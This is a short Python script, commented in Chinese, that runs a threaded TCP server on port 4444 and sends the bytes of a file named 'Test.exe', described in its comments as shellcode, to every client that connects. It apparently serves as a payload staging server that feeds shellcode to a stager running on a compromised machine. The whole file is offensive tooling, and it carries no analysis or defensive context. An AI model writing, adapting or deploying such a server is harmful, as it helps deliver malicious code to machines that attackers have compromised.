import socket
import threading

IP = '0.0.0.0'
PORT = 4444  # 修改为4444端口
SHELLCODE_FILE = 'Test.exe' # 要传输的shellcode文件

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((IP, PORT))
    server.listen(5)
    print(f'[*] Listening on {IP}:{PORT}')
    
    while True:
        client, address = server.accept()
        print(f'[*] Accepted connection from {address[0]}:{address[1]}')
        client_handler = threading.Thread(
            target=handle_client,
            args=(client,)
        )
        client_handler.start()

def handle_client(client_socket):
    try:
        # 读取shellcode文件
        with open(SHELLCODE_FILE, 'rb') as f:
            shellcode = f.read()
        
        # 发送shellcode给客户端
        client_socket.sendall(shellcode)
        print(f'[*] Sent {len(shellcode)} bytes of shellcode')
        
    except FileNotFoundError:
        print(f'[!] Error: {SHELLCODE_FILE} not found')
        client_socket.sendall(b'Error: Shellcode file not found')
    except Exception as e:
        print(f'[!] Error: {str(e)}')
    finally:
        client_socket.close()

if __name__ == '__main__':
    main()